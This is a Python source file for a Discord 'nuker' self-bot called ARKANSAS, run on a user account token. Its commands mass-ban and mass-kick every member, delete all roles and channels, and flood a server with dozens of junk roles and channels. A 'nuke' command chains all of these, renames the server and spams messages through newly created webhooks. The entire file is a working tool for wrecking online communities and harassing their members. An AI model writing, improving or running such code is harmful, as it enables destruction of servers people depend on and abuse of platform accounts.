version = 4.0

import sys
import random
import discord
import termcolor
import os
import colorama
import webbrowser
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore
import requests
import json
import configfile as m

hooks = []


token = m.token
prefix = m.prefix


os.system("clear")
print(f"{Fore.RED}Loading...")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")


@bot.event
async def on_connect():
    os.system("clear")
    print(rf"""{Fore.RED}

                        ░█████╗░██████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░█████╗░░██████╗
                        ██╔══██╗██╔══██╗██║░██╔╝██╔══██╗████╗░██║██╔════╝██╔══██╗██╔════╝
                        ███████║██████╔╝█████═╝░███████║██╔██╗██║╚█████╗░███████║╚█████╗░
                        ██╔══██║██╔══██╗██╔═██╗░██╔══██║██║╚████║░╚═══██╗██╔══██║░╚═══██╗
                        ██║░░██║██║░░██║██║░╚██╗██║░░██║██║░╚███║██████╔╝██║░░██║██████╔╝
                        ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═════╝░
                                                                                          
                                                                                          
                                                                                          
                                                            {Fore.RED}ARKANSAS
    """)
    print(f"{Fore.RED}                       ARKANSAS Version | {version}")
    print(
        f"{Fore.BLUE}                      Logged in as: | {bot.user.name}#{bot.user.discriminator}"
    )
    print(f"{Fore.BLUE}                      User ID | {bot.user.id}")
    print(f"{Fore.BLUE}                      Prefix | {prefix}")
    print(f"{Fore.BLUE}{prefix}ban - Bans all server members.")
    print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
    print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
    print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
    print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
    print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
    print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server.")
    print(f"{Fore.BLUE}{prefix}shutdown/off/stop/end - Exits.")
    print("")


    #Mass ban
    @bot.command()
    async def ban(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        for member in ctx.guild.members:
            try:
                await member.ban()
                print(f"Banned {member}")
            except:
                print(f"Unable to ban {member}, you likely don't have permission.")
                pass

    #Mass kick
    @bot.command()
    async def kick(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        print(f"{Fore.RED}Kicking has begun.")
        for member in ctx.guild.members:
            try:
                await member.kick()
                print(f"Kicked {member}")
            except:
                print(f"Unable to kick {member}, you likely don't have permission.")
                pass

    #Role deletion/Mass role creation
    @bot.command()
    async def role(ctx, choice):
        if choice == "create":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Initiating...")
            print(f"{Fore.BLUE}Please wait...")
            print("Role creation has begun. Enjoy.")
            for i in range(50):
                try:
                    await ctx.guild.create_role(name="u mad bro?")
                except:
                    print("Unable to make new channels, you likely don't have permission.")



        elif choice == "delete":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Removing roles...")
            print(f"{Fore.BLUE}Please wait...")
            roles = ctx.guild.roles
            roles.pop(0)
            for role in roles:
                try:
                    await role.delete()
                    print(f"Deleted {role}.")
                except:
                    print(f"Unable to delete {role}, you likely don't have permission.")
                    pass
        else:
            await print(f"{choice} is not a valid option.")

    #Mass rename
    @bot.command()
    async def rename(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print(f"{user.name} has been renamed to {rename_to}.")
            except:
                print(f"{user.name} has not been renamed to {rename_to}, you likely don't have permission.")



    #Channel deletion/Mass creation
    @bot.command()
    async def channel(ctx, choice):
        if choice == "create":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Creating channels...")
            print(f"{Fore.BLUE}Please wait....")
            try:
                for i in range(50):
                    await ctx.guild.create_text_channel(name="HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA")
                    await ctx.guild.create_voice_channel(name="HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA")
            except:
                print("Unable to create channels, you likely don't have permission.")


        elif choice == "delete":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Deleting channels...")
            print(f"{Fore.BLUE}Please wait...")
            print("Channel deletion has begun.")
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    print(f"Deleted {channel}.")
                except:
                    print(f"{Fore.RED}Unable to delete {channel}, you likely don't have permission.")
                    pass
            print("Finished deleting channels.")
        
        
        else:
            print(f"{Fore.RED}Not a valid option.")

    #End
    @bot.command(aliases=["shutdown", "off", "stop"], )
    async def end(ctx):
        await ctx.message.delete()
        os.system("clear -x")
        print(f"{Fore.RED}Exiting the console...")
        await bot.logout()

    #Nuke
    @bot.command(aliases=["GLORY_TO_ARKANSAS"])
    async def nuke(ctx):
        await ctx.message.delete()
        print(f"{Fore.RED}Here we go.\n")
        print(f"{Fore.RED}Banning has begun.\n")

        try:
            for member in ctx.guild.members:
                await member.ban()
                print(f"Banned {member}.")
        except:
            print(f"Unable to ban {member}, you likely don't have permission.")
            pass
            


        print(f"{Fore.RED}Role deletion has begun. \n")
        roles = ctx.guild.roles
        roles.pop(0)

        for role in roles:
            try:
                await role.delete()
                print(f"Deleted {role}.")
            except:
                print(f"Unable to delete {role}, you likely don't have permission.")
                pass


        print(f"{Fore.GREEN}Role deletion has finished.\n")
        print(f"{Fore.RED}Mass role and channel creation has begun.\n")

        #Deletes channels

        print(f"{Fore.RED}Channel deletion has begun.")
        print("")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"Deleted {channel}.")
            except:
                print("Unable to delete channels, you likely don't have permission.")

        print(f"{Fore.GREEN}Channel deletion has finished. \n")

        #Creates channels

        for i in range(50):
            try:
                await ctx.guild.create_role(name=f"HAHAHAHAHAH")
                await ctx.guild.create_text_channel(name=f"HAHAHAHAHAH")
                await ctx.guild.create_voice_channel(name=f"HAHAHAHAHAH")
            except:
                print("Unable to create roles, you likely don't have permission.")


        print("Mass channel creation has finished.")

        try:
            await ctx.guild.edit(name="HAHAHAHAHAH")
            with open('image.png', 'rb') as f:
                icon = f.read()
                await ctx.guild.edit(icon=icon)
        except:
            print("Unable to edit server.")
        
        for channel in list(ctx.message.guild.textchannels):
            webhook = await channel.create_webhook(name = "nuked")
            webhook_url = webhook.url
            hooks += [webhook_url]

            original_stdout = sys.stdout
            with open('hooks', 'w') as f:
                sys.stdout = f
                print(hooks)
                sys.stdout = original_stdout
        

        for x in range(50):
            hook = random.choice(hooks)
            data={}
            data["content"] = random.choice(m.messages)
            data["username"] = "HAHAHAHAHAH"
            try:
                requests.post(hook, data=json.dumps(data))
            except Exception as e:
                print(e)


        print("Nuke complete.")


    
    @bot.command(aliases=["commands"], )
    async def help(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}{prefix}ban - Bans all server members.")
        print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
        print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
        print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
        print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
        print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
        print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server.")
        print(f"{Fore.BLUE}{prefix}shutdown/off/stop/end - Exits.")
        print("")


bot.run(token, bot=False)
